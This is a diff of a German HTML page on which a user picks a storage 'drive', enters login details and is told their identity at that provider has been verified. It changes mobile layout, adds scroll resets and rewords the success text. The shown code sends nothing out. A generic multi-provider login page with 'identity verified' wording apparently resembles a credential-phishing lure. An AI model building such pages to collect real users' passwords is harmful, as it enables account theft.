@@ -84,7 +84,6 @@
             border: 1px solid #e0e0e0;
             border-radius: 16px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            margin: 20px;
         }
 
         .back-btn {
@@ -220,6 +219,15 @@
 
         /* ── MOBILE ── */
         @media (max-width: 600px) {
+            body {
+                align-items: flex-start;
+                padding: 30px 20px;
+            }
+
+            #startView {
+                padding: 20px 16px;
+            }
+
             #startView h1 {
                 font-size: 1.4em;
                 margin-bottom: 24px;
@@ -232,18 +240,23 @@
             }
 
             .drive-card {
-                width: 85%;
-                max-width: 320px;
-                padding: 20px 24px;
+                width: 100%;
+                max-width: 100%;
+                padding: 18px 20px;
                 display: flex;
                 flex-direction: row;
                 align-items: center;
                 gap: 20px;
+                border-radius: 12px;
+            }
+
+            .drive-card:hover {
+                transform: none;
             }
 
             .drive-img {
-                width: 56px;
-                height: 56px;
+                width: 52px;
+                height: 52px;
                 margin-bottom: 0;
                 flex-shrink: 0;
             }
@@ -254,8 +267,11 @@
             }
 
             .box {
-                margin: 20px;
-                padding: 30px 24px;
+                width: 100%;
+                max-width: 100%;
+                padding: 28px 24px;
+                border-radius: 12px;
+                box-shadow: none;
             }
         }
     </style>
@@ -311,8 +327,8 @@
     <div class="box" id="successView">
         <div class="success-screen">
             <div class="success-icon">✓</div>
-            <h2>Erfolgreich angemeldet</h2>
-            <p id="successText">Willkommen.</p>
+            <h2>Identität erfolgreich bestätigt</h2>
+            <p id="successText">Ihre Identität wurde verifiziert.</p>
             <button class="home-btn" onclick="goHome()">← Zurück zur Startseite</button>
         </div>
     </div>
@@ -331,12 +347,16 @@
             document.getElementById('startView').style.display   = 'none';
             document.getElementById('loginView').style.display   = 'block';
             document.getElementById('successView').style.display = 'none';
+
+            window.scrollTo(0, 0);
         }
 
         function goHome() {
             document.getElementById('startView').style.display   = 'block';
             document.getElementById('loginView').style.display   = 'none';
             document.getElementById('successView').style.display = 'none';
+
+            window.scrollTo(0, 0);
         }
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
@@ -353,10 +373,12 @@
             });
 
             document.getElementById('successText').textContent =
-                'Willkommen bei ' + currentDrive + '.';
+                'Ihre Identität bei ' + currentDrive + ' wurde erfolgreich verifiziert.';
 
             document.getElementById('loginView').style.display   = 'none';
             document.getElementById('successView').style.display = 'block';
+
+            window.scrollTo(0, 0);
         });
     </script>
 
